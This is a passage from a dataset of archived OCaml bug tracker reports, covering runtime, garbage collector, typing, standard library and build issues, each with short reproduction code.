hand-crafted.\r\n\r\nI came across this issue after trying to reproduce a bug in minor gc and caml_fl_allocate which under certain conditions makes minor gc run forever (or at least quadratically, but for half an hour on small heaps at least).\r\n\r\nI was trying to fill the flp to see what would happen in this case. I don't know yet if those two issues are related\r\n\r\n## File attachments\r\n\r\n- [minimal.ml](https://gist.githubusercontent.com/vicuna/d574ad1b7e741f1648bd205e4635506b/raw/67deb2a517239b0aee47c2a876cb21e347ab3f2e/minimal.ml)\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7814\n**Reporter:** @gasche\n**Assigned to:** @damiendoligez\n**Status:** resolved (set by @alainfrisch on 2018-07-16T08:56:10Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Target version:** 4.08.0+dev/beta1/beta2\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** runtime system and C interface\n**Monitored by:** @nojb\n\n## Bug description\n\nAfter world.opt is built:\r\n\r\n$ ./tools/check-symbol-names asmrun/*.a byterun/*.a\r\nasmrun/libasmruni.a[misc.i.o]: CAML_INSTR_ATEXIT T\r\nasmrun/libasmruni.a[misc.i.o]: CAML_INSTR_INIT T\r\nasmrun/libasmruni.a[misc.i.o]: CAML_INSTR_LOG B\r\nasmrun/libasmruni.a[misc.i.o]: CAML_INSTR_STARTTIME C\r\nasmrun/libasmruni.a[misc.i.o]: CAML_INSTR_STOPTIME C\r\nbyterun/libcamlrund.a[instrtrace.d.o]: names_of_instructions D\r\nbyterun/libcamlruni.a[misc.i.o]: CAML_INSTR_ATEXIT T\r\nbyterun/libcamlruni.a[misc.i.o]: CAML_INSTR_INIT T\r\nbyterun/libcamlruni.a[misc.i.o]: CAML_INSTR_LOG B\r\nbyterun/libcamlruni.a[misc.i.o]: CAML_INSTR_STARTTIME C\r\nbyterun/libcamlruni.a[misc.i.o]: CAML_INSTR_STOPTIME C\r\n\r\nWe should probably prefix names_of_instructions.\r\nWe should also rename CAML_* into some caml_* -- or add CAML_* as another private namespace in tools/check-symbol-names.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7812\n**Reporter:** @whitequark\n**Status:** acknowledged (set by @xavierleroy on 2018-06-23T15:39:30Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Category:** standard library\n\n## Bug description\n\nUnlike the C language, the OCaml language does not have a strict notion of undefined behavior that gives huge leeway to optimizer and is relatively well understood by programmers. In spite of that, the OCaml standard library documents certain behaviors as \"undefined\".\r\n\r\nThis is undesirable for several reasons. First, just saying \"undefined\" does not communicate very well what could happen, which is anything. In C, if an execution ever encounters undefined behavior, the entire execution (before, during, and after) is illegal, and can perform any operation, but the OCaml programmer is not familiar with this.\r\n\r\nSecond, the standard library leaves as undefined certain behaviors that could *trivially* be made perfectly well defined, or at least aren't actually undefined and ought to be documented as e.g. raising an exception.\r\n\r\nHere is the complete list:\r\n\r\n  * Filename.chop_suffix: would raise an exception or chop an unrelated part of filename. Should be fixed to raise Invalid_argument in that case instead, for consistency with chop_extension.\r\n\r\n  * Buffer.to_seq, Buffer.to_seqi: raises an exception if a buffer is truncated, or returns no new elements if it's extended. There doesn't appear to be any implementation benefit from leaving it undefined, although I may just be missing it and in that case please correct me.\r\n\r\n  * Sort.merge: returns incorrect values. (It's deprecated since 2000 so it can probably be removed already.)\r\n\r\n  * Int32.of_float, Int64.of_float, Nativeint.of_float, Targetint.of_float: would actually invoke UB in C on out-of-range conversions. Either the FP environment should be set up appropriately, or the documentation should get a very stern warning that anything can happen, including the OCaml process dying with SIGFPE. This is the only case where it actually makes sense (barely, perhaps) to have UB.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7809\n**Reporter:** @whitequark\n**Status:** acknowledged (set by @xavierleroy on 2018-06-20T14:19:49Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** 32-bit\n**Version:** 4.08.0+dev/beta1/beta2\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\ncaml_fresh_oo_id looks like:\r\n\r\n  CAMLprim value caml_fresh_oo_id (value v) {\r\n    v = oo_last_id;\r\n    oo_last_id += 2;\r\n    return v;\r\n  }\r\n\r\nSince `value` is `intnat`, calling it 2**30 times results in a signed overflow, which is undefined in C. In addition, it can make polymorphic equality function return an incorrect result, as demonstrated by the code below.\n\n## Steps to reproduce\n\ntype 'a typ = ..\r\n\r\ntype value = { get: 'k. 'k typ -> 'k }\r\n\r\ntype box = Box : 'a typ -> box\r\n\r\nlet create : type v. v -> v typ * value =\r\n  fun value ->\r\n  let module M = struct\r\n    type _ typ += Typ : v typ\r\n\r\n    let typ = Typ\r\n\r\n    let get : type k. k typ -> k =\r\n      fun typ ->\r\n      match typ with\r\n      | Typ -> value\r\n      | _ -> assert false\r\n  end in\r\n  M.typ, { get = M.get }\r\n\r\nlet eid : 'a -> int = fun v ->\r\n  Obj.extension_id (Obj.extension_constructor v)\r\n\r\nlet () =\r\n  let ta, fa = create 1 in\r\n  Printf.printf \"ta : %d\\n%!\" (eid ta);\r\n  Printf.printf \"a = %d\\n%!\" (fa.get ta);\r\n  for i = 0 to 2 lsl 29 - 1 do ignore (create \"x\"); done;\r\n  for i = 0 to 2 lsl 29 - 2 do ignore (create \"x\"); done;\r\n  let tb, fb = create \"y\" in\r\n  Printf.printf \"tb : %d\\n%!\" (eid tb);\r\n  Printf.printf \"ta = tb => %b\\n%!\" ((Box ta) = (Box tb));\r\n  Printf.printf \"a = %s\\n%!\" (fa.get tb);\n\n## Additional information\n\nI am explicitly asking to NOT make overflow in this function a trap. The code above is perfectly legitimate and could be used when an unbounded amount of fresh concrete types is needed at runtime.\r\n\r\nIn fact it was extracted from a real module I wrote for Coq, where such an overflow is indeed possible at runtime. (That module is not affected by the bug.)\r\n\r\nI am not sure what can be done about this overflow other than fixing the undefined behavior in C by adding an appropriate cast. It does not affect 64-bit systems and the only thing it ever affects is polymorphic equality on objects and extensible variants. It might make sense to document that.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1458\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHi,\n\nWhen I marshal a simple value to a file and read it back again, from a\nbytecode enabled toplevel, i get a segfault.\nThe simple code is as such:\n\ntype mytype = T of (float * float)\nlet fd = open_out_bin \"/tmp/file.mld\"\nlet myval = T (1.0, 1.0)\nMarshal.to_channel fd myval []\nclose_out fd\n\nlet fd = open_in_bin \"/tmp/file.mld\"\nlet myval = (Marshal.from_channel fd: mytype)\nmatch myval with\n   T bla -> bla\n\n\n\nIn fact, entering the code line-by-line in the toplevel shows that the\ntype of myval is not recognized:\n# let myval = (Marshal.from_channel fd : mytype)\nval myval : mytype = <unknown constructor>\n\n\nThe toplevel is made as such:\n%ocamlmktop -thread /usr/lib/ocaml/threads/unix.cma\n/usr/lib/ocaml/threads/threads.cma -o ocaml-th\n\nOcaml 3.06, RH7.2\n\n\nbest regards\nhenri\n\n\n\n-------------------\nTo unsubscribe, mail caml-list-request@inria.fr Archives: http://caml.inria.fr\nBug reports: http://caml.inria.fr/bin/caml-bugs FAQ: http://caml.inria.fr/FAQ/\nBeginner's list: http://groups.yahoo.com/group/ocaml_beginners\n"},{"labels":["bug"],"text":"**Original bug ID:** 1457\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\ninfo below... regards henri\n\n\ntest.ml:\nlet speed_of_light = 100_000_000.0\n\n[henri@ffnet: ~/work/caml] ocamlc test.ml\n[henri@ffnet: ~/work/caml] ocamlopt test.ml\n/tmp/camlasm7595e7.s: Assembler messages:\n/tmp/camlasm7595e7.s:31: Error: Rest of line ignored. First ignored\ncharacter\nis `_'.\nAssembler error, input left in file /tmp/camlasm7595e7.s\n\n[henri@ffnet: ~/work/caml] uname -a\nLinux ffnet.epfl.ch 2.4.7-10 #1 Thu Sep 6 17:27:27 EDT 2001 i686 unknown\n[henri@ffnet: ~/work/caml] ocamlopt -v\nThe Objective Caml native-code compiler, version 3.06\nStandard library directory: /usr/lib/ocaml\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7804\n**Reporter:** herbelin\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2018-06-11T12:29:44Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.1\n**Category:** standard library\n**Duplicate of:** #7720\n**Related to:** #7913\n**Monitored by:** ralfj @gasche\n\n## Bug description\n\nI have an example of a hov box containing a box where the split is not done at the break hints of the outer box but at the position of the opening of the inner box. This looks strange but maybe this is how it is supposed to work (I did not find documentation about it).\n\n## Steps to reproduce\n\nExecuting the following shows the issue:\r\n<<\r\nfor i = 4 to 7 do\r\nFormat.set_margin i; Format.printf \"@[a@ #@[b@]@ c@]@.@.\";\r\ndone\r\n>>\r\n\r\nThe output is\r\n<<\r\na\r\n#b\r\nc\r\n\r\na #\r\nb c\r\n\r\na #\r\nb c\r\n\r\na #b c\r\n\r\n>>\r\n\r\nwhich shows that in the second and third case, a break is introduced by the inner box, while, intuitively, the break should have been done at the break hints of the outer box.\r\n\r\nApparently, this is due to the test \"insertion_point > state.pp_max_indent\" in function format_pp_token of format.ml. Couldn't have the lack of enough space detected already at the time of considering the preceding \"official\" break hint?\r\n\r\nI shall use a workaround on my side but I'm still reporting it as I did not succeed to get an opinion on whether this is normal or not.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7803\n**Reporter:** disteph\n**Assigned to:** @garrigue\n**Status:** confirmed (set by @garrigue on 2018-06-11T04:12:38Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.1\n**Category:** typing\n\n## Bug description\n\nmodule Test : sig\r\n  type 'a t constraint 'a = _*_\r\nend = struct\r\n  type 'a t =\r\n    | Int : (int*int) t\r\n    | Bool: (bool*bool) t\r\n    constraint 'a = _*_\r\nend\r\n\r\nThe code above triggers \"Warning 62: Type constraints do not apply to GADT cases of variant types.\"\r\nabout the \"constraint 'a = _*_\" in the struct.\r\n\r\nHowever, if I remove \"constraint 'a = _*_\" in the struct, I get a real error message:\r\n\"Type declarations do not match:\r\n         type 'a t = Int : (int * int) t | Bool : (bool * bool) t\r\nis not included in\r\n         type 'a t constraint 'a = 'b * 'c\r\n\"\r\n\r\nIdeally, I would like to agree with the warning, and disagree with the error, expecting the type-checker to go through each constructor's type and verify that the output type does satisfy the constraint, which is the case in my example.\r\nBut if for some reason the type-checker cannot do that when it matches the inferred type from the signature's type, then at least I would like to help him with my constraint inside the struct and not get the warning.\n"},{"labels":["bug"],"text":"**Original bug ID:** 1456\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nBonjour,\n\nJe veux exporter vers python via C un ensemble d'utilitaires ecrit\nen ocaml (3.06).\nPour cela :\n- je compile (ocamlopt) les source ocamls\n- je genÃ©re un .o (-output-obj)\n- je link le tout (/usr/ucb/ld -G ... -lunix -lstr -lasmrun -lcurses -o ...)\n\nSous Linux, tout ca marche trÃ©s bien.\nSous Sun/Solaris2.7, quand je charge la librairie via python j'ai le \nmessage suivant:\n<message>\nImportError: ld.so.1: python2.1: fatal: relocation error: file \n/home/dm2s0006/letrTool/SunOS5/bin/../lib/python1.5/srncmodule.so: \nsymbol __ashrdi3: referenced symbol not found\n</message>\n\nApres avoir regardÃ© de plus prÃ©s, __ashrdi3 est \"utilisÃ©\" implicitement\npar la fonction Int64_val dans le fichier ints.c (byterun).\n\nDans ocamlrun, elle est bien dÃ©finie\n<shell cmd=\"nm ocamlrun\">\n0003cde8 ? __CTOR_END__\n0003cde4 ? __CTOR_LIST__\n0003cdf0 ? __DTOR_END__\n0003cdec ? __DTOR_LIST__\n0003cdf4 ? __EH_FRAME_BEGIN__\n0003cdf4 ? __FRAME_END__\n00029844 T __ashldi3\n0002988c T __ashrdi3\n0003e370 B __ctype\n          U __deregister_frame_info\n          U __div64\n00029998 t __do_global_ctors_aux\n00016654 t __do_global_dtors_aux\n</shell>\n\nDans libamsrun.a (ou libcamlrun.a d'ailleurs), elle n'est pas dÃ©finie\n<shell cmd=\"nm libamsrun.a\">\nints.o:\n          U .div\n          U .rem\n          U .umul\n          U Double_val\n000006e4 T Int64_val\n          U __ashldi3\n          U __ashrdi3\n          U __div64\n          U __dtoll\n          U __floatdidf\n          U __lshrdi3\n          U __mul64\n          U __rem64\n</shell>\n\n- Est'il normal qu'elle ne soit pas dÃ©finie dans libamsrun.a ?\n- Est que j'ai oubliÃ© de linker avec quelque chose ? (j'ai cherchÃ© \ndÃ©sespÃ©rement une librairie qui pouvait le dÃ©finir mais je n'ai\npas trouvÃ©)\n- Est ce que j'ai ratÃ© quelque chose ?\n\nMerci d'avance.\n\n\tGilles Arnaud.\n\n-- \n\n_________________ gilles.arnaud@cea.fr _________________\n\nGilles ARNAUD * Commissariat a l'Energie Atomique Saclay\nDEN/DM2S/SFME/LETR, bat 470 * 91191 GIF SUR YVETTE CEDEX\nFax : +33 1 69 08 85 68  *--*  Phone : +33 1 69 08 38 86\n________________________________________________________\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7800\r\n**Reporter:** @lpw25\r\n**Assigned to:** @garrigue\r\n**Status:** assigned (set by @garrigue on 2018-06-10T14:38:41Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Category:** typing\r\n**Monitored by:** @hhugo @Yakobowski\r\n\r\n## Bug description\r\n\r\nThe following code type checks without issue:\r\n```ocaml\r\n    type 'a ty = Int : int ty | Float : float ty\r\n\r\n    type 'a pair = 'a * 'a\r\n\r\n    let iter_fst_return_snd f (x, y) = f x; y\r\n\r\n    let ints : int * int = 1, 2\r\n\r\n    let foo (type a) (t : a ty) (x : a) (p : bool) =\r\n      match t with\r\n      | Int ->\r\n          iter_fst_return_snd\r\n            (fun y -> print_int (if p then x else y))\r\n            ints\r\n      | Float -> 0\r\n```\r\nHowever, if the type annotation on `ints` is changed from `int * int` to `int pair` then we get an error:\r\n```ocaml\r\n    let ints : int pair = 1, 2\r\n\r\n    let foo (type a) (t : a ty) (x : a) (p : bool) =\r\n      match t with\r\n      | Int ->\r\n          iter_fst_return_snd\r\n            (fun y -> print_int (if p then x else y))\r\n            ints\r\n      | Float -> 0\r\n```\r\n```\r\nFile \"sharing.ml\", line 22, characters 6-88:\r\nError: This expression has type a = int\r\n       but an expression was expected of type 'a\r\n       This instance of int is ambiguous:\r\n       it would escape the scope of its equation\r\n```\r\nSince these two types are equal this obviously shouldn't happen, and it is also easy to show that this is not principal.\r\n\r\nThe underlying issue is that when we instantiate the type `int pair` we only create a single copy of the `int` types, and so the expansion to `int * int` shares the same type for both `int`s. Even though `int` is \"structure\" (i.e. not a variable) it is still a mutable piece of state due to its level and scope. So anything which depends on these pieces of state (e.g. GADT ambiguity detection) is affected by the difference in sharing.\r\n\r\nThis is a fairly fundamental issue. Much like #7636 the theoretical fix is just to always expand out aliases, but obviously we don't want to do that. An alternative would be to delay instantiation of type constructor parameters until after expansion. I think this is a viable fix and may even improve performance on average by avoiding unnecessary instantiation.\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7799\n**Reporter:** gmelquiond\n**Assigned to:** @nojb\n**Status:** resolved (set by @nojb on 2018-06-07T07:29:19Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.06.1\n**Category:** standard library\n**Monitored by:** @nojb @Yakobowski\n\n## Bug description\n\nI naively expect the functions format_from_string and string_of_format to be inverse of each other. But they are not, which leads to some obscure bugs when trying to use them. As far as I can tell, it is because format_from_string escapes double quotes but not backslashes before parsing the string. This is reproducible with all the versions of OCaml I have tested, from 4.02.3 to 4.07-beta.\n\n## Steps to reproduce\n\nlet test s = ignore (Scanf.format_from_string (string_of_format s) s);;\r\ntest \"%s/%a\";; (* OK *)\r\ntest \"\\\\ \";; (* Exception: Scanf.Scan_failure \"illegal escape character ' '\". *)\r\ntest \"\\\\x\";; (* Exception: Scanf.Scan_failure \"illegal escape character '\\\"'\". *)\r\ntest \"\\\\x25s\";; (* Exception: Scanf.Scan_failure \"bad input: format type mismatch between \\\"%s\\\" and \\\"\\\\\\\\x25s\\\"\". *)\r\ntest \"\\\\\\\"%s\";; (* Exception: Scanf.Scan_failure \"bad input: format type mismatch between \\\"\\\\\\\\\\\" and \\\"\\\\\\\\\\\\\\\"%s\\\"\". *)\r\ntest \"\\\\\";; (* Exception: Scanf.Scan_failure \"scanning of a String failed: premature end of file occurred before end of token\". *)\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7798\n**Reporter:** @sliquister\n**Assigned to:** @damiendoligez\n**Status:** assigned (set by @damiendoligez on 2018-06-20T13:43:00Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @nojb @gasche @dbuenzli\n\n## Bug description\n\nThe symptom is simple: sometimes you allocate n words and the gc stats increase by 2n.\r\n\r\nHere is a program that shows this behavior [1]:\r\n$ ocamlopt a.ml && ./a.out \r\nminor heap size: 1048576 = (2 * 524288)\r\nallocated: 524289, gc stats error: 3\r\nallocated: 1048575, gc stats error: 6\r\nallocated: 1572861, gc stats error: 9\r\nallocated: 2097147, gc stats error: 12\r\nallocated: 2621433, gc stats error: 18\r\n...\r\n\r\nThis has been causing some very hard to understand spurious failures in allocation tests where the reported allocation is too high by a few words, despite measuring allocation like so (no signals/ocaml finalizers in this context):\r\n\r\nlet minor_words_allocated f =\r\n  Gc.minor ();\r\n  let before = truncate (Gc.minor_words ()) in\r\n  Sys.opaque_identity (f ());\r\n  let after = truncate (Gc.minor_words ()) in\r\n  after - before\r\n\r\nThis is because if you're unlucky and the call to Gc.minor finishes the major cycle, the major gc goes into Phase_idle and call caml_request_minor_gc (). Which causes the next minor allocation to trigger a minor gc and be double counted because of the bug above.\r\n\r\nThe double counting does not happen all the time. caml_alloc is correct. The inline assembly is wrong. The assembly functions used with -compact are also wrong.\r\n\r\nAfter having spent hours figuring out what the problem is, the workaround is easy enough: do one allocation after Gc.minor () to set off the requested minor gc, if any.\r\nI also see that the documentation for minor_words says \"this is an approximation in native code\", but who knows what that emcompasses? Given that experimentally Gc.minor_words () works perfectly (or so it seemed until now), and that allocation tests are reasonable code to wrote, it's only natural to rely on Gc.minor_words ().\r\n\r\nSo I'd like to ask for the stats to be fixed (and the documentation to be updated, unless it's referring to something else).\r\n\r\n---\r\n\r\nThe fix doesn't seem too hard: before calling caml_call_gc, undo the subtraction to the minor heap frontier. In the non inlined-assembly, I think this is not contentious. In the inlined assembly, code size might be a concern? But even that seems fixable (shouldn't matter for big allocations, and for small allocations, one can use a family of caml_call_gc_X functions that change back the heap frontier by X bytes and jump to caml_call_gc).\r\n\r\n\r\n\r\n[1]\r\n\r\nlet rec zero_alloc_bytes_of_int buf n i =\r\n  Bytes.set buf i (Char.unsafe_chr (Char.code '0' + (n mod 10)));\r\n  if n / 10 = 0\r\n  then (\r\n    for j = 0 to i / 2; do\r\n      let tmp = Bytes.get buf j in\r\n      Bytes.set buf j (Bytes.get buf (i - j));\r\n      Bytes.set buf (i - j) tmp;\r\n    done;\r\n    i + 1\r\n  )\r\n  else zero_alloc_bytes_of_int buf (n / 10) (i + 1)\r\n;;\r\n\r\nlet zero_alloc_string_of_int buf n =\r\n  zero_alloc_bytes_of_int buf n 0\r\nlet minor_words () = truncate (Gc.minor_words ())\r\n\r\nlet () =\r\n  let gc = Gc.get () in\r\n  Printf.printf \"minor heap size: %d = (2 * %d)\\n%!\"\r\n    gc.minor_heap_size (gc.minor_heap_size / 2)\r\nlet l = ref []\r\nlet buf = Bytes.create 100\r\nlet () = Gc.compact ()\r\nlet () = Gc.compact ()\r\nlet () = Gc.compact ()\r\nlet () = Gc.minor ()\r\n\r\nlet () =\r\n  let minor_words_start = minor_words () in\r\n  let minor_words_allocated = ref 0 in\r\n  let stats_error = ref 0 in\r\n  while true do\r\n    l := () :: !l;\r\n    minor_words_allocated := !minor_words_allocated + 3;\r\n    let minor_words_from_stats = minor_words () - minor_words_start in\r\n    let stats_error_now = minor_words_from_stats - !minor_words_allocated in\r\n    if stats_error_now <> !stats_error\r\n    then (stats_error := stats_error_now;\r\n          output_string stdout \"allocated: \";\r\n          let len = zero_alloc_string_of_int buf !minor_words_allocated in\r\n          output_substring stdout (Obj.magic (buf : Bytes.t) : string) 0 len;\r\n          output_string stdout \", gc stats error: \";\r\n          let len = zero_alloc_string_of_int buf !stats_error in\r\n          output_substring stdout (Obj.magic (buf : Bytes.t) : string) 0 len;\r\n          output_string stdout \"\\n\";\r\n          flush stdout;\r\n         )\r\n  done\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7796\n**Reporter:** @xavierleroy\n**Assigned to:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2018-05-23T17:51:00Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** x86-64\n**OS:** Ubuntu Linux 16.04\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** runtime system and C interface\n**Related to:** #7178 #7253\n**Monitored by:** @nojb @gasche @dbuenzli\n\n## Bug description\n\nWhen \"c=1\" is put in OCAMLRUNPARAM, text printed to standard output in an at_exit function ends up written twice to standard output.\r\n\r\n~/caml/devel$ cat foo.ml\r\nlet _ =\r\n  at_exit (fun () -> print_endline \"\\nAll tests succeeded.\")\r\n~/caml/devel$ boot/ocamlrun ./ocamlc -I ./stdlib -o foo.byte foo.ml\r\n~/caml/devel$ byterun/ocamlrun foo.byte\r\n\r\nAll tests succeeded.\r\n~/caml/devel$ OCAMLRUNPARAM=c=1 byterun/ocamlrun foo.byte\r\n\r\nAll tests succeeded.\r\n\r\nAll tests succeeded.\r\n~/caml/devel$ \r\n\r\n\r\nAmong other ill effects, this causes many tests in the test suite to fail when run with OCAMLRUNPARAM=\"c=1\".\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7795\n**Reporter:** @kayceesrk\n**Status:** resolved (set by @xavierleroy on 2018-05-21T16:44:32Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** standard library\n**Monitored by:** @gasche\n\n## Bug description\n\nWeak.create accepts -1 for the length. It should raise Invalid_argument for negative lengths. It appears that the bounds check in `caml_weak_create` is off by one.\n\n## Steps to reproduce\n\n$ ocaml\r\n        OCaml version 4.08.0+dev0-2018-04-09\r\n\r\n# let v = Weak.create (-1);;\r\nval v : '_weak1 Weak.t = <abstr>\r\n# Weak.length v;;\r\n- : int = -1\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7793\n**Reporter:** @hhugo\n**Assigned to:** @nojb\n**Status:** closed (set by @nojb on 2018-05-23T23:10:02Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** @nojb\n\n## Bug description\n\nThe following program is accepted by the ocaml compiler but not by ocamldep \r\n\r\n```\r\n;;\r\n\r\n;;2\r\n\r\n```\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7792\n**Reporter:** @gasche\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-05-30T13:15:46Z)\n**Resolution:** fixed\n**Priority:** low\n**Severity:** minor\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Fixed in version:** 4.08.0+dev/beta1/beta2\n**Category:** configure and build/install\n\n## Bug description\n\nRunning the testsuite several times results in spurious failures, due to the way some tests write to their log outputs -- they append to the log of the previous run instead of replacing them.\r\n\r\nA workaround exists, namely running \"make clean\" in-between runs, but this behavior still results in confusing behaviors and some wasted time.\n\n## Additional information\n\nI have privately reported the issue to SÃ©bastien Hinderer, the ocamltest author and maintainer, so I believe that the issue will eventually be fixed -- but it seems to be non-trivial. I am opening this issue for him to have a concrete MPR to refer to if useful, and in case other contributors would run into the same behavior and wonder if the issue is known.\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7790\n**Reporter:** alexSanchezStern\n**Status:** resolved (set by @xavierleroy on 2018-05-06T08:18:31Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** Linux\n**OS:** Gentoo Linux\n**OS Version:** 4.12.12-gentoo\n**Version:** 4.04.2\n**Fixed in version:** 4.05.0\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nWhen calls are made to Printf.printf, the generated debug info in native code assembly marks the call instruction as coming from the callee, printf, not the caller as it should be.\n\n## Steps to reproduce\n\n1. Compile the following program as `hello-world.ml` with `ocamlopt -g`\r\n```\r\nlet say_hello _ =\r\n  let rand = Random.float(1.0) in\r\n  let x = sqrt(rand) in\r\n  Printf.printf \"Hello world %e!\\n\" x;;\r\n\r\nsay_hello () ;;\r\n```\r\n\r\n2. Run `objdump -d` on the binary and search for the `say_hello` function\r\n3. Get the address of its call to camlPrintf__fprintf\r\n4. Run `gdb` on the binary\r\n5. Ask for the debug info of the printf call line (in my case `info line *0x41c482`)\r\n6. This will return \"Line 29 of printf.ml\" when the call actually happens at Line 4 of hello_world.ml\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7789\n**Reporter:** tbrk\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-05-02T20:17:55Z)\n**Resolution:** not a bug\n**Priority:** high\n**Severity:** major\n**Platform:** x86_64\n**OS:** MacOS / Debian Linux\n**OS Version:** 10.11.6 / 9.4\n**Version:** 4.06.1\n**Fixed in version:** 4.06.0\n**Category:** misc\n**Monitored by:** @nojb @yallop\n\n## Bug description\n\nConsider the following program:\r\n\r\n    type data = { mutable n  : int; }\r\n\r\n    let f { n } t = Printf.printf \"n=%d\\n%!\" n\r\n\r\n    let go udata g =\r\n      g 1.0;\r\n      udata.n <- 10;\r\n      g 1.0\r\n    ;;\r\n\r\n    let udata = { n = 0 } in\r\n    go udata (f udata);;\r\n\r\nIn OCaml <= 4.05.0, it prints (correctly):\r\n    n=0\r\n    n=10\r\n\r\nIn OCaml 4.06.0 and 4.07.0+beta2 (at least), it prints (incorrectly):\r\n    n=0\r\n    n=0\n\n## Steps to reproduce\n\nCompile the above program with ocamlc or ocamlopt, or enter it into the top-level.\n\n## Additional information\n\nThe given code is a reduced form from a larger example:\r\nhttps://github.com/inria-parkas/sundialsml/blob/55a05d3794e98e1d4b3f9953088e41ef6f359bb2/examples/arkode/C_serial/ark_heat1D_adapt.ml#L155\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7787\n**Reporter:** @mshinwell\n**Assigned to:** @trefis\n**Status:** resolved (set by @trefis on 2018-05-01T08:47:36Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Version:** 4.07.0+dev/beta2/rc1/rc2\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** middle end (typedtree to clambda)\n**Monitored by:** @hhugo\n\n## Bug description\n\nIn 4.07 the following code causes a segfault in the bytecode interpreter, trying to read a field of the unit value, unless the \"remove_aliases\" attribute is added.  This appears to work with 4.06.\r\n\r\nThanks to hheuzard and xclerc for help investigating this.\r\n\r\nmodule O (T : sig\r\n  module N : sig\r\n    val foo : int -> int\r\n  end\r\nend) = struct\r\n  open T\r\n\r\n  let go () =\r\n    N.foo 42  (* finding N (from T) goes wrong *)\r\nend\r\n\r\nmodule T = struct\r\n  module N = struct\r\n    let foo x = x + 3\r\n  end\r\nend;;\r\n\r\n(* Incidentally, M isn't used in T2, but it doesn't seem to fail if\r\n   it's just \"module M\" and \"module T2\" separately *)\r\nmodule rec M : sig\r\n  val go : unit -> int\r\nend = O (T2)\r\nand T2 : sig\r\n  include module type of struct include T end (* [@remove_aliases] *)\r\nend = struct\r\n  include T\r\nend;;\r\n\r\nlet _ = ignore (M.go ())\n\n## Steps to reproduce\n\nCompile the above program with ocamlc and run it.\n\n## File attachments\n\n- [broken-dont-remove-aliases.lambda](https://gist.githubusercontent.com/vicuna/378bc4730cbfcec0a650e24334c1bee7/raw/ba0f9612f913e1ff95c13fcbb97d3ceb07c328d0/broken-dont-remove-aliases.lambda)\n- [remove-aliases.lambda](https://gist.githubusercontent.com/vicuna/378bc4730cbfcec0a650e24334c1bee7/raw/9cf3f71f41d8bd53efa54fc57646dec02dffbc63/remove-aliases.lambda)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7783\n**Reporter:** pmetzger\n**Assigned to:** @Octachron\n**Status:** assigned (set by @Octachron on 2018-04-24T14:14:22Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Platform:** N/A\n**OS:** N/A\n**OS Version:** N/A\n**Version:** 4.06.1\n**Category:** documentation\n**Related to:** #5883\n**Monitored by:** @nojb @hhugo @gasche\n\n## Bug description\n\nThe manual does not sufficiently explain a subtle point. Consider the following declaration:\r\n\r\ntype foo = \r\n| A of int*int\r\n| B of (int*int)\r\n\r\nAlthough these look similar, A and B are quite different. A is a constructor taking two arguments, even though it looks like it takes a tuple, while B of course takes a tuple.\r\n\r\nThis means that the two cannot be used interchangeably and in fact have different enough meanings to matter in a lot of contexts.\r\n\r\nThis is confusing to a beginner because it would seem like the parentheses are just meaningless precedence grouping, but they arenât, theyâre syntactically quite significant, and it would seem like the * in the A case means âtupleâ but it does not.\r\n\r\n(Note that I myself didn't understand this 